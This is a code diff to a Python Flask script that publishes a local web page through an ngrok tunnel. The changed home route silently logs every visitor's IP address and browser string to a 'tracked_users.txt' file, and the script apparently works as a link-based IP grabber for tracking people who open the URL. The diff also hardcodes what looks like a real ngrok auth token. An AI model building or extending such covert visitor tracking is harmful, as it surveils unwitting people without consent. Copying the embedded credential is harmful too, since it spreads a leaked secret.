@@ -7,6 +7,8 @@ import sys
 from datetime import datetime
 from flask import Flask, request, render_template, jsonify
 
+NGROK_AUTH_TOKEN = "2kvsTq98QwTBvXUKy72hcbgX9WR_5bAbjfCLZW5RijW1MzAZ8"
+NGROK_PATH = "ngrok.exe" if os.path.exists("ngrok.exe") else "ngrok"
 FLASK_PORT = 5000
 
 app = Flask(__name__)
@@ -59,21 +61,32 @@ def start_ngrok(port):
     print(f"[+] Launching ngrok tunnel on port {port} ...")
     
     try:
+        # Kill any existing ngrok processes
+        if os.name == 'nt':  # Windows
+            os.system('taskkill /f /im ngrok.exe 2>nul')
+        else:  # Unix/Linux
+            os.system('pkill ngrok 2>/dev/null')
+        
+        time.sleep(1)  # Wait for process to be killed
+        
         ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        time.sleep(2)  # Give ngrok time to start
+        print("[+] Waiting for ngrok tunnel to initialize...")
+        time.sleep(5)  # Give ngrok more time to start
 
         public_url = None
-        for _ in range(15):  # wait for tunnel to start
+        for _ in range(30):  # Increased wait time and attempts
             try:
                 resp = requests.get("http://127.0.0.1:4040/api/tunnels")
-                tunnels = resp.json().get("tunnels", [])
-                for t in tunnels:
-                    if t["proto"] == "https":
-                        public_url = t["public_url"]
+                if resp.status_code == 200:
+                    tunnels = resp.json().get("tunnels", [])
+                    for t in tunnels:
+                        if t["proto"] == "https":
+                            public_url = t["public_url"]
+                            break
+                    if public_url:
                         break
-                if public_url:
-                    break
-            except Exception:
+            except Exception as e:
+                print(f"[!] Waiting for ngrok... ({_+1}/30)")
                 time.sleep(1)
 
         if public_url:
@@ -92,6 +105,17 @@ def start_ngrok(port):
 
 @app.route("/")
 def home():
+    # Get visitor information
+    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    user_agent = request.headers.get("User-Agent", "Unknown")
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Log visitor information
+    log_entry = f"[{timestamp}] IP: {user_ip} | User-Agent: {user_agent}\n"
+    with open("tracked_users.txt", "a", encoding="utf-8") as f:
+        f.write(log_entry)
+    
+    print(f"[NEW VISITOR] IP: {user_ip}")
     return render_template("index.html")
 
 @app.route("/log", methods=["POST"])
